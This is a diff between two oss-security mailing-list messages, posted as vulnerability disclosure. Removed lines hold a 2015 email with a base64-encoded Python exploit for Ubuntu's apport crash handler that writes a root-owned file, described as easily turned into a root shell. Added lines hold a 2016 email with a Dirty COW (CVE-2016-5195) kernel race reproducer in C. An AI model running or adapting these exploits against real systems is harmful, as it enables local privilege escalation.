@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2181" "Wednesday" "15" "April" "2015" "12:55:53" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkLAM+5DpyS4L6aqiyKT4AZY7fbW+5M7+=rBYNcE-Cr6aw@mail.gmail.com>" "51" "Re: [oss-security] Re: Problems in automatic crash analysis frameworks" nil nil nil "4" "2015041519:55:53" "[oss-security] Re: Problems in automatic crash analysis frameworks" (number mark "        taviso@googl Apr 15   51/2181  " thread-indent "\"Re: [oss-security] Re: Problems in automatic crash analysis frameworks\"\n") "<CAJ_zFkLHirkfhNbHGne8V_n2RJ_kS_LL7MLA8_Sw3Tp-Q85T8Q@mail.gmail.com>" ("<20150414155515.BFCAD6C0075@smtpvmsrv1.mitre.org>" "<552D3A20.8040909@canonical.com>" "<CAJ_zFkLtZteX-ge_=9jE8KHxDmKZ=7cwWUmwkHwGHbnCpiQWZA@mail.gmail.com>" "<CAJ_zFk+7eV52Ui1+aV+BKhc68zKi3pmPsgPmFoOsw8Qg6dHPAQ@mail.gmail.com>" "<CAJ_zFkLA=Qn_exvDW8Rym1jx_jS0vo=vuTJ7ON71qk8BSB=1dw@mail.gmail.com>" "<20150414221607.GA5795@boyd>" "<CAJ_zFkLHirkfhNbHGne8V_n2RJ_kS_LL7MLA8_Sw3Tp-Q85T8Q@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["8056" "Sunday" "30" "October" "2016" "06:35:57" "+0100" "Solar Designer" "solar@openwall.com" "<20161030053557.GA3024@openwall.com>" "327" "Re: [oss-security] CVE-2016-5195 test case" nil nil nil "10" "2016103005:35:57" "[oss-security] CVE-2016-5195 test case" (number mark "U       solar@openwa Oct 30  327/8056  " thread-indent "\"Re: [oss-security] CVE-2016-5195 test case\"\n") "<CALCETrUyZyOgMNC7sN0s6+jfzZbou+butapbyu-PFev3GJgiww@mail.gmail.com>" ("<CALCETrUyZyOgMNC7sN0s6+jfzZbou+butapbyu-PFev3GJgiww@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 18351 invoked by uid 550); 15 Apr 2015 19:57:04 -0000
+Received: (qmail 26048 invoked by uid 550); 30 Oct 2016 05:37:04 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,98 +11,344 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 18333 invoked from network); 15 Apr 2015 19:57:03 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=google.com; s=20120113;
-        h=mime-version:in-reply-to:references:from:date:message-id:subject:to
-         :cc:content-type;
-        bh=cWDisl28PwAypYB+4LX1uypk9HhgQRHxK7DgCa97Nes=;
-        b=JFm6V9Uy3sf2mRhwEwXAUFJ52xhFJziKfE2rAbfZYfR3Vjhc2S1EpHNK+mGBCMc/9L
-         osHtUitJmzdJ+qeP45vGIbu58MPK7zCjRzPy+vWKeNuW+s+kXrWJpKlSy5yUVfiMwa1R
-         pktAGrOqKtdsaibRZJqjxn62BOLLXr4gKXDwd6uKLdkGmS5geUKZpD4+mW1VjMLXxBGD
-         onBOMBLNUIoBHwxzQwcgY5QX0P2koctTpjXpVRJoIWB5rm7GAREuaUwOtjWQvbzNv1tE
-         lUrl5oGLqr+Og4WMZMRb7nhBenmT5goXn8RTyUZvFnQmPLnSslE/THtlGEjnFhrStbHy
-         r2ag==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
-         :message-id:subject:to:cc:content-type;
-        bh=cWDisl28PwAypYB+4LX1uypk9HhgQRHxK7DgCa97Nes=;
-        b=kmcRKx7/WByIcMXkxBSnxydKQ8oRrgfGe5gf0EFq8xmk7Fk2Sed4VOj6aUMZ6dKrod
-         iHAXDGjzCL0zTX+Bbvpfm6smY4ZOBQ5oQZ3E3ecWzOjFPZ2aSMlGbwOJdwjkg3O0SyXE
-         6B6qehstUNN7Z4l6DSEnbw+lMlR3YdE638Mbrd5KrnbTIbIhTSnKi9K0YGovanyO5/57
-         R2TFBN6RmdA+Hr/ik8CaINUgWhT7BkeitPH/ren7ioz5RkwPvI91rnVbRQ/kzvSi0/mP
-         ls+5idPwMCO4NzIueO6cgKOtcd4hVaedK2t8VNmeF5+soTGF2akPVWtoeoba4Q/ur+fs
-         cLAw==
-X-Gm-Message-State: ALoCoQnKDNEC7OoK6OxthQSC+UGHOG/rQTFojvWH8ZecQP5KoyOQSecUVLo0pDQ/Z88SPsVL+luF
-X-Received: by 10.229.122.138 with SMTP id l10mr35123430qcr.26.1429127774607;
- Wed, 15 Apr 2015 12:56:14 -0700 (PDT)
-MIME-Version: 1.0
-In-Reply-To: <CAJ_zFkLHirkfhNbHGne8V_n2RJ_kS_LL7MLA8_Sw3Tp-Q85T8Q@mail.gmail.com>
-References: <20150414155515.BFCAD6C0075@smtpvmsrv1.mitre.org>
- <552D3A20.8040909@canonical.com> <CAJ_zFkLtZteX-ge_=9jE8KHxDmKZ=7cwWUmwkHwGHbnCpiQWZA@mail.gmail.com>
- <CAJ_zFk+7eV52Ui1+aV+BKhc68zKi3pmPsgPmFoOsw8Qg6dHPAQ@mail.gmail.com>
- <CAJ_zFkLA=Qn_exvDW8Rym1jx_jS0vo=vuTJ7ON71qk8BSB=1dw@mail.gmail.com>
- <20150414221607.GA5795@boyd> <CAJ_zFkLHirkfhNbHGne8V_n2RJ_kS_LL7MLA8_Sw3Tp-Q85T8Q@mail.gmail.com>
-Message-ID: <CAJ_zFkLAM+5DpyS4L6aqiyKT4AZY7fbW+5M7+=rBYNcE-Cr6aw@mail.gmail.com>
-Content-Type: multipart/mixed; boundary=001a1134a8b45856c00513c8bd75
-Cc: oss-security@lists.openwall.com, 
-	Assign a CVE Identifier <cve-assign@mitre.org>, security <security@ubuntu.com>, 
-	=?UTF-8?Q?St=C3=A9phane_Graber?= <stgraber@ubuntu.com>
-Date: Wed, 15 Apr 2015 12:55:53 -0700
-From: Tavis Ormandy <taviso@google.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] Re: Problems in automatic crash analysis frameworks
-To: Tyler Hicks <tyhicks@canonical.com>
+Received: (qmail 25898 invoked from network); 30 Oct 2016 05:36:49 -0000
+Date: Sun, 30 Oct 2016 06:35:57 +0100
+From: Solar Designer <solar@openwall.com>
+To: oss-security@lists.openwall.com
+Message-ID: <20161030053557.GA3024@openwall.com>
+References: <CALCETrUyZyOgMNC7sN0s6+jfzZbou+butapbyu-PFev3GJgiww@mail.gmail.com>
+Mime-Version: 1.0
+Content-Type: multipart/mixed; boundary="UugvWAfsgieZRqgk"
+Content-Disposition: inline
+In-Reply-To: <CALCETrUyZyOgMNC7sN0s6+jfzZbou+butapbyu-PFev3GJgiww@mail.gmail.com>
+User-Agent: Mutt/1.4.2.3i
+Subject: Re: [oss-security] CVE-2016-5195 test case
 
---001a1134a8b45856c00513c8bd75
-Content-Type: text/plain; charset=UTF-8
+--UugvWAfsgieZRqgk
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
 
-On Wed, Apr 15, 2015 at 11:48 AM, Tavis Ormandy <taviso@google.com> wrote:
-> FWIW, I verified this is exploitable.
->
+Hi Andy,
 
-Here's the script I used to verify, it should create the file
-/etc/rootfiletest. By using the partial trick or creating parse
-errors, this is easy to turn into a root shell.
+On Thu, Oct 27, 2016 at 08:35:01AM -0700, Andy Lutomirski wrote:
+> I sat on this longer than makes any sense given how easy to reproduce
+> CVE-2016-5195 is, but here's a reasonably portable reproducer.  It's
+> intended to have no side effects, but your mileage may vary.
+> 
+> https://github.com/amluto/vulnerabilities/blob/master/others/CVE-2016-5195/test_CVE-2016-5195.c
+> 
+> This will use /proc/self/mem or ptrace automatically, and it's
+> intended to be portable to a wide range of kernels.
 
-Note: I'm a c programmer, I don't know python at all, it's probably
-the worlds worst python code - I used python because I was reading the
-python3-lxc code.
+Unfortunately, it still didn't work on systems without O_TMPFILE or/and
+without a defined PR_SET_PTRACER_ANY.
 
-taviso@ubuntu:~/tmp$ ls -l /etc/rootfiletest
-ls: cannot access /etc/rootfiletest: No such file or directory
-taviso@ubuntu:~/tmp$ rm -rf /tmp/?0* /tmp/exploit/
-taviso@ubuntu:~/tmp$ python3 test.py
-taviso@ubuntu:~/tmp$ ls -l /etc/rootfiletest
--rw-rw---- 1 root root 0 Apr 15 12:53 /etc/rootfiletest
+Attached is a slightly more portable version.
 
-Tavis.
+> It's an improved
+> version of the test case I originally sent out to distros (oops!).
 
---001a1134a8b45856c00513c8bd75
-Content-Type: text/x-python; charset=US-ASCII; name="exploit.py"
-Content-Disposition: attachment; filename="exploit.py"
-Content-Transfer-Encoding: base64
-X-Attachment-Id: f_i8j5o1rr0
+Why "oops"?  Do you mean just the distros vs. linux-distros issue?
 
-IyEvdXNyL2Jpbi9weXRob24zCiMgVGVzdCBzY3JpcHQgZm9yIGFwcG9ydCB2
-dWxuZXJhYmlsaXR5LgojICB0YXZpc29AY21weGNoZzhiLmNvbQoKaW1wb3J0
-IHNvY2tldCwgb3MsIHNpZ25hbAppbXBvcnQgY3R5cGVzCgpvcy5ta2Rpcign
-L3RtcC9cbjAgMSAyIDMgNCA1IDYgJykKb3MubWtkaXIoJy90bXAvXG4wIDEg
-MiAzIDQgNSA2IC90bXAnKQpvcy5ta2RpcignL3RtcC9cbjAgMSAyIDMgNCA1
-IDYgL3RtcC9leHBsb2l0JykKb3MubWtkaXIoJy90bXAvXG4wIDEgMiAzIDQg
-NSA2IC90bXAvZXhwbG9pdC9leHBsb2l0JykKb3MubWtkaXIoJy90bXAvZXhw
-bG9pdC8nKQpvcy5ta2RpcignL3RtcC9leHBsb2l0L2V4cGxvaXQvJykKCmYg
-PSBvcGVuKCcvdG1wL2V4cGxvaXQvZXhwbG9pdC9jb25maWcnLCAndycpCmYu
-d3JpdGUoImx4Yy5sb2dmaWxlID0gL2V0Yy9yb290ZmlsZXRlc3RcbiIpCmYu
-Y2xvc2UoKQoKc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX1VOSVgs
-IHNvY2tldC5TT0NLX1NUUkVBTSkKc29jay5iaW5kKCcvdG1wL1xuMCAxIDIg
-MyA0IDUgNiAvdG1wL2V4cGxvaXQvZXhwbG9pdC9jb21tYW5kJykKc29jay5s
-aXN0ZW4oMSkKCmxpYmMgPSBjdHlwZXMuQ0RMTCgibGliYy5zby42IikKCmxp
-YmMudW5zaGFyZSgweDIwMDAwMDAwfDB4MTAwMDAwMDApCgppZiBsaWJjLmZv
-cmsoKSA9PSAwOgoJaWYgbGliYy5mb3JrKCkgPT0gMDoKCQlvcy5raWxsKGxp
-YmMuZ2V0cGlkKCksIHNpZ25hbC5TSUdTRUdWKQoJZWxzZToKCQlsaWJjLndh
-aXRwaWQoLTEsIDAsIDApCmVsc2U6CglsaWJjLndhaXRwaWQoLTEsIDAsIDAp
-Cg==
+It's OK to send reproducers to the [linux-]distros list (the appropriate
+one) as long as you intend to make them public shortly after public
+disclosure of the issue itself (the earliest of: a few days or when
+other public exploits/reproducers show up).  I think for most issues,
+which are not high impact or/and where non-trivial pre-conditions need
+to be met, it makes sense to make the (non-weaponized) reproducers
+public right away (on the initial public disclosure date, along with
+full vulnerability detail), but occasionally there will be issues like
+this where delaying posting the reproducer a little bit makes sense.
+It's just that I think you shouldn't have delayed as much.  Ideally, you
+should have made a posting in here without the reproducer on the initial
+public disclosure date (in fact, that's your responsibility per the
+[linux-]distros list policy), and as others made reproducers available
+within a day, you should have also posted yours the next day.
 
---001a1134a8b45856c00513c8bd75--
+Just my opinion.
+
+Thank you for your help in handling of this issue!
+
+Alexander
+
+--UugvWAfsgieZRqgk
+Content-Type: text/x-c; charset=us-ascii
+Content-Disposition: attachment; filename="test_CVE-2016-5195.c"
+
+/*
+ * Test that MAP_PRIVATE works right (CVE-2016-5195).
+ *
+ * Copyright (c) 2016 Andy Lutomirski.  All rights reserved.
+ *
+ * GPL v2
+ *
+ * Thanks to Ben Hutchings and Oleg Nesterov for some improvements.
+ */
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <err.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <sys/mman.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <pthread.h>
+#include <stdlib.h>
+#include <sys/syscall.h>
+#include <sys/ptrace.h>
+#include <sys/prctl.h>
+#include <linux/prctl.h>
+#include <signal.h>
+#include <sys/wait.h>
+#include <errno.h>
+#include <string.h>
+
+#ifndef PR_SET_PTRACER
+#define PR_SET_PTRACER 0x59616d61
+#endif
+
+#ifndef PR_SET_PTRACER_ANY
+#define PR_SET_PTRACER_ANY ((unsigned long)-1)
+#endif
+
+static long volatile *write_iters;
+static volatile unsigned long ready;
+static void *p_priv;
+static volatile char *p_shared;
+static int fd;
+
+static const char one = 1;
+
+static void *madvise_thread(void *ctx)
+{
+	while (!ready)
+		;
+
+	long madvise_iters = 0;
+
+	while (true) {
+		char a = p_shared[0];
+		char b = p_shared[4096];
+		if (a || b) {
+			printf("+ PWNED %d,%d! (%ld writes per page, %ld madvise calls)\n",
+			       (int)a, (int)b, *write_iters, madvise_iters);
+			exit(0);
+		}
+
+		// This is optional.
+		*(volatile char *)(p_priv);
+
+		madvise(p_priv, 1, MADV_DONTNEED);
+		madvise(p_priv + 4096, 1, MADV_DONTNEED);
+		madvise_iters++;
+	}
+}
+
+static void try_procmem(void)
+{
+	int procmem = open("/proc/self/mem", O_WRONLY, 0);
+	if (procmem == -1 ) {
+		printf("- Can't open /proc/self/mem\n");
+		return;
+	}
+
+	char test = 0;
+	pwrite(procmem, &one, 1, (off_t)&test);
+	if (!test) {
+		printf("- Cant write to /proc/self/mem\n");
+		close(procmem);
+		procmem = -1;
+		return;
+	}
+
+	printf("+ Using /proc/self/mem\n");
+	printf("  If the test gets stuck here forever, then you are probably not vulnerable.\n");
+	ready = 1;
+
+	while (true) {
+		(*write_iters)++;
+		pwrite(procmem, &one, 1, (off_t)p_priv);
+		pwrite(procmem, &one, 1, (off_t)p_priv + 4096);
+	}
+}
+
+static void ptrace_proc(pid_t parent)
+{
+	prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0, 0);
+
+	munmap(p_priv, 8192);  /* We're done with our copy. */
+
+	if (ptrace(PTRACE_ATTACH, parent, NULL, NULL) != 0)
+		err(1, "PTRACE_ATTACH");
+
+	int status;
+	waitpid(parent, &status, __WALL);
+	if (!WIFSTOPPED(status)) {
+		printf("- ptrace child is in the wrong state\n");
+		exit(1);
+	}
+
+	printf("+ ptrace is attached\n");
+
+	printf("  If the test gets stuck here forever, then you are probably not vulnerable.\n");
+
+	unsigned long oneul = 1;
+	if (ptrace(PTRACE_POKEDATA, parent, &ready, &oneul) != 0)
+		err(1, "PTRACE_POKEDATA for ready");
+
+	while (true) {
+		(*write_iters)++;
+		unsigned long word = (unsigned long)0x0101010101010101ULL;
+		if (ptrace(PTRACE_POKEDATA, parent, p_priv, (void *)word) != 0) {
+			if (errno == ESRCH)
+				goto sleep_forever;
+			err(1, "PTRACE_POKEDATA");
+		}
+		if (ptrace(PTRACE_POKEDATA, parent, (char *)p_priv + 4096, (void *)word) != 0) {
+			if (errno == ESRCH)
+				goto sleep_forever;
+			err(1, "PTRACE_POKEDATA");
+		}
+	}
+
+sleep_forever:
+	/*
+	 * Don't exit lest we confuse the parent -- we'll get cleaned up
+	 * by the death signal.
+	 */
+	while (true)
+		pause();
+}
+
+/* Separate thread to avoid breaking job control */
+static void *ptrace_thread(void *unused)
+{
+	pid_t parent = syscall(SYS_gettid);
+	prctl(PR_SET_PTRACER, PR_SET_PTRACER_ANY, 0, 0, 0);
+	pid_t child = fork();
+	prctl(PR_SET_DUMPABLE, 1, 0, 0, 0, 0);
+
+	if (child < 0) {
+		err(1, "fork");
+	} else if (!child) {
+		ptrace_proc(parent);
+	}
+
+	ready = 1;
+
+	while (true)
+		pause();
+}
+
+static void try_ptrace(void)
+{
+	pthread_t t;
+	int status;
+
+	pthread_create(&t, NULL, ptrace_thread, NULL);
+
+	while (wait(&status) < 0)
+		;
+
+	printf("- ptracer child exited\n");
+}
+
+int main(int argc, char **argv)
+{
+	fd = -1;
+#ifdef O_TMPFILE
+	fd = open(".", O_TMPFILE | O_RDWR, 0700);
+#else
+	errno = EISDIR;
+#endif
+	if (fd != -1) {
+		printf("+ Using O_TMPFILE\n");
+	} else {
+		char tmp_name[30] = "test_CVE-2016-5195-XXXXXX";
+		if (errno != EISDIR) {
+			warn("O_TMPFILE");
+			printf("- Make sure you run this test in a writable directory\n");
+			exit(1);
+		}
+		fd = mkstemp(tmp_name);
+		if (fd == -1) {
+			warn("mkstemp");
+			printf("- Make sure you run this test in a writable directory\n");
+			exit(1);
+		}
+		unlink(tmp_name);
+		printf("+ Using a conventional temporary file\n");
+	}
+	if (ftruncate(fd, 8192) != 0)
+		err(1, "ftruncate");
+
+	// This hopefully reduces the risk of crashing the system.
+	pwrite(fd, &one, 1, 8);
+	pwrite(fd, &one, 1, 4096 + 8);
+
+	write_iters = mmap(NULL, sizeof(unsigned long), PROT_READ | PROT_WRITE,
+			   MAP_ANONYMOUS | MAP_SHARED, -1, 0);
+	
+	p_shared = mmap(NULL, 8192, PROT_READ, MAP_SHARED, fd, 0);
+	if (p_shared == MAP_FAILED)
+		err(1, "open");
+
+	p_priv = mmap(NULL, 8192, PROT_READ, MAP_PRIVATE, fd, 0);
+	if (p_priv == MAP_FAILED)
+		err(1, "mmap");
+
+	pthread_t t;
+	pthread_create(&t, NULL, madvise_thread, NULL);
+
+	if (argc != 2 || strcmp(argv[1], "ptrace"))
+		try_procmem();
+	try_ptrace();
+	printf("No force-write means detected\n");
+
+	return 0;
+}
+
+--UugvWAfsgieZRqgk
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: attachment; filename="test_CVE-2016-5195.c.diff"
+
+--- test_CVE-2016-5195.c.orig	2016-10-30 06:16:53 +0100
++++ test_CVE-2016-5195.c	2016-10-30 06:16:53 +0100
+@@ -29,10 +29,14 @@
+ #include <errno.h>
+ #include <string.h>
+ 
+-#ifndef PT_SET_PTRACER
++#ifndef PR_SET_PTRACER
+ #define PR_SET_PTRACER 0x59616d61
+ #endif
+ 
++#ifndef PR_SET_PTRACER_ANY
++#define PR_SET_PTRACER_ANY ((unsigned long)-1)
++#endif
++
+ static long volatile *write_iters;
+ static volatile unsigned long ready;
+ static void *p_priv;
+@@ -180,6 +184,8 @@
+ 	fd = -1;
+ #ifdef O_TMPFILE
+ 	fd = open(".", O_TMPFILE | O_RDWR, 0700);
++#else
++	errno = EISDIR;
+ #endif
+ 	if (fd != -1) {
+ 		printf("+ Using O_TMPFILE\n");
+@@ -224,4 +230,6 @@
+ 		try_procmem();
+ 	try_ptrace();
+ 	printf("No force-write means detected\n");
++
++	return 0;
+ }
+
+--UugvWAfsgieZRqgk--
